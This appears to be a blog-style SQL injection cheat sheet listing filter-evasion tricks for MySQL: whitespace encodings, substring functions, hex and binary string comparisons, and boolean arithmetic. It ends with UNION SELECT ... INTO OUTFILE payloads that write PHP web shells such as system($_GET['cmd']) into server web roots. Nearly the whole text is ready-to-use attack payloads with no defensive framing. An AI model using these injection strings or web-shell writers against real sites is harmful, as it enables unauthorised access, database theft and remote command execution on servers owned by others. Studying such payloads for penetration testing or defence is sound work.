---
title: ["SQL Injection Cheat Sheet"]
date: 2024-12-27 09:00:00 +0900
categories: [cheatsheet, sqli]
tags: [web, sqli, cheatsheet]
---

### White Space
```
%20  // SPACE
%09  // HORIZONTAL TAB
%0a  // LINE FEED
%0b  // VERTICAL TAB
%0c  // FORM FEED
%0d  // CARRIAGE RETURN
%a0  // NBSP
/**/
select(id)from(table)where(id=1)
```

### Substring
```
substr(id,1,1)
substr(id from 1 for 1)
mid(id,1,1)
right(left(id,1),1)
lpad(id,1,space(1))
reverse(right(reverse(id),1))
convert(id,char(1))
```

### String Compare without Single Quotation
```
admin=0x61646d696e                                 // using Hex
admin=0b0110000101100100011011010110100101101110   // using Binary
substr(monthname(from_unixtime(1)),2,1)='a'        // using Gadget
```

### Number Expression
```
True = 1
False = 0
True+True = 2
True-True = 0
```


### MYSQL Command Execution
#### WEBSHELL - OUTFILE Method
```sql
[...] UNION SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
[...] UNION SELECT '' INTO OUTFILE '/var/www/html/x.php' FIELDS TERMINATED BY '<?php phpinfo();?>'
[...] UNION SELECT 1,2,3,4,5,0x3c3f70687020706870696e666f28293b203f3e into outfile 'C:\\wamp\\www\\pwnd.php'-- -
[...] union all select 1,2,3,4,"<?php echo shell_exec($_GET['cmd']);?>",6 into OUTFILE 'c:/inetpub/wwwroot/backdoor.php'
```

Make sure to check `secure-file-priv` path.  
When `mysql/config/my.cnf` has `secure-file-priv=/tmp/` set, it means:  
  MYSQL's `INTO OUTFILE` command can only write files to the `/tmp/` directory
